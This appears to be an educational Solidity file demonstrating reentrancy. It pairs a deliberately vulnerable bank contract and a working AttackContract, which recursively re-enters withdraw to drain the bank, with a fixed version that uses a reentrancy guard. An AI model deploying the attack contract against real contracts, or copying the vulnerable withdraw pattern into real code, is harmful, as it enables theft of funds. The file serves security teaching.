// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ============================================================
// REENTRANCY VULNERABILITY SAMPLE CONTRACT
// This contract demonstrates the classic reentrancy vulnerability
// Used for security testing and demonstration purposes
// ============================================================

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

/**
 * @title VulnerableBank
 * @dev A bank contract with reentrancy vulnerability
 * 
 * SECURITY WARNING: This contract contains intentional 
 * vulnerabilities for educational testing. DO NOT use in production.
 * 
 * The vulnerability exists in the withdraw() function where
 * state updates happen AFTER the external call, allowing an
 * attacker to recursively call withdraw() before the balance is reset.
 */
contract VulnerableBank {
    // State variables
    mapping(address => uint256) public balances;
    mapping(address => uint256) public depositTimestamps;
    
    uint256 public totalDeposits;
    uint256 public totalWithdrawals;
    uint256 public transactionCount;
    
    address public admin;
    uint256 public constant MIN_DEPOSIT = 0.01 ether;
    uint256 public constant MAX_DEPOSIT = 100 ether;
    
    // Events
    event Deposit(address indexed user, uint256 amount, uint256 timestamp);
    event Withdraw(address indexed user, uint256 amount, uint256 timestamp);
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    
    // Modifier for security checks
    modifier onlyAdmin() {
        require(msg.sender == admin, "Only admin can call this function");
        _;
    }
    
    modifier positiveAmount(uint256 _amount) {
        require(_amount > 0, "Amount must be positive");
        _;
    }
    
    /**
     * @dev Constructor sets the deployer as admin
     */
    constructor() {
        admin = msg.sender;
    }
    
    /**
     * @dev Deposit function - stores Ethers in user's balance
     * 
     * VULNERABILITY: Missing access controls and no reentrancy guard
     */
    function deposit() public payable {
        require(msg.value >= MIN_DEPOSIT, "Deposit too small");
        require(msg.value <= MAX_DEPOSIT, "Deposit too large");
        
        balances[msg.sender] += msg.value;
        depositTimestamps[msg.sender] = block.timestamp;
        totalDeposits += msg.value;
        transactionCount++;
        
        emit Deposit(msg.sender, msg.value, block.timestamp);
    }
    
    /**
     * @dev Withdraw function - MAIN VULNERABILITY
     * 
     * SECURITY ISSUE: State (balances) is updated AFTER the external call
     * This allows an attacker to call withdraw() recursively before
     * the balance is reset to zero.
     * 
     * Attack pattern:
     * 1. Attacker deploys a malicious fallback contract
     * 2. Attacker calls withdraw() on VulnerableBank
     * 3. When VulnerableBank sends ETH to attacker, fallback executes
     * 4. Fallback calls withdraw() again immediately
     * 5. This repeats until VulnerableBank's balance is drained
     * 
     * FIX: Use ReentrancyGuard from OpenZeppelin or implement
     * Checks-Effects-Interactions pattern
     */
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");
        
        // BEGIN ATTACK WINDOW - External call before state update
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        // END ATTACK WINDOW
        
        // State update happens AFTER external call (TOO LATE!)
        balances[msg.sender] = 0;
        totalWithdrawals += bal;
        transactionCount++;
        
        emit Withdraw(msg.sender, bal, block.timestamp);
    }
    
    /**
     * @dev Withdraw all funds - same vulnerability
     */
    function withdrawAll() public {
        withdraw();
    }
    
    /**
     * @dev Emergency withdraw with percentage penalty
     */
    function emergencyWithdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");
        
        uint256 penalty = bal / 10; // 10% penalty to contract
        uint256 amount = bal - penalty;
        
        // Same vulnerability here
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed");
        
        balances[msg.sender] = 0;
        totalWithdrawals += amount;
        transactionCount++;
        
        emit Withdraw(msg.sender, amount, block.timestamp);
    }
    
    /**
     * @dev Transfer balance to another user - ALSO VULNERABLE
     */
    function transfer(address _to, uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // External call to another address
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Transfer failed");
        
        balances[msg.sender] -= _amount;
        balances[_to] += _amount;
        
        emit Transfer(msg.sender, _to, _amount);
    }
    
    /**
     * @dev Batch transfer - SAME VULNERABILITY in each call
     */
    function batchTransfer(address[] memory _recipients, uint256[] memory _amounts) public {
        require(_recipients.length == _amounts.length, "Arrays must match");
        
        for (uint256 i = 0; i < _recipients.length; i++) {
            if (balances[msg.sender] >= _amounts[i]) {
                // Recursive attack possible here too
                (bool sent, ) = _recipients[i].call{value: _amounts[i]}("");
                if (sent) {
                    balances[msg.sender] -= _amounts[i];
                    balances[_recipients[i]] += _amounts[i];
                    emit Transfer(msg.sender, _recipients[i], _amounts[i]);
                }
            }
        }
    }
    
    /**
     * @dev Get user balance
     */
    function getBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }
    
    /**
     * @dev Get contract ether balance
     */
    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    /**
     * @dev Update admin address
     */
    function updateAdmin(address _newAdmin) public onlyAdmin {
        address oldAdmin = admin;
        admin = _newAdmin;
        emit AdminChanged(oldAdmin, _newAdmin);
    }
    
    /**
     * @dev Kill contract and return funds to admin
     */
    function destroy() public onlyAdmin {
        payable(admin).transfer(address(this).balance);
    }
    
    // Receive ETH deposits
    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
    
    // Fallback for unexpected ETH
    fallback() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}

/**
 * @title AttackContract
 * @dev Malicious contract to exploit VulnerableBank
 * 
 * This contract demonstrates how to exploit reentrancy vulnerability
 */
contract AttackContract {
    VulnerableBank public bank;
    address public attacker;
    uint256 public initialBalance;
    uint256 public attackCount;
    
    event AttackInitiated(uint256 balance);
    event AttackExploited(uint256 stolen);
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        attacker = msg.sender;
    }
    
    /**
     * @dev Start the attack by depositing some ETH first
     */
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to start");
        initialBalance = address(bank).balance;
        
        // First deposit to have some balance
        bank.deposit{value: msg.value}();
        
        // Then trigger withdrawal attempt
        bank.withdraw();
        
        emit AttackInitiated(initialBalance);
    }
    
    /**
     * @dev Fallback function - executes when receiving ETH
     * This is where the reentrancy attack happens
     */
    receive() external payable {
        attackCount++;
        
        // While bank has balance, keep calling withdraw recursively
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
    
    /**
     * @dev Withdraw stolen funds
     */
    function withdrawStolen() public {
        require(msg.sender == attacker, "Only attacker");
        payable(attacker).transfer(address(this).balance);
        emit AttackExploited(address(this).balance);
    }
    
    // Get current balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title FixedBank
 * @dev CORRECT implementation with reentrancy protection
 * 
 * This shows how to properly secure against reentrancy attacks
 */
contract FixedBank is ReentrancyGuard {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public depositTimestamps;
    
    uint256 public totalDeposits;
    uint256 public totalWithdrawals;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    // Apply reentrancy guard to vulnerable function
    function withdraw() public nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Insufficient balance");
        
        // FIRST: Update state BEFORE external call
        balances[msg.sender] = 0;
        totalWithdrawals += bal;
        
        // THEN: Make external call (now safe because state is updated)
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        
        emit Withdraw(msg.sender, bal);
    }
    
    function deposit() public payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    function getBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }
    
    receive() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
}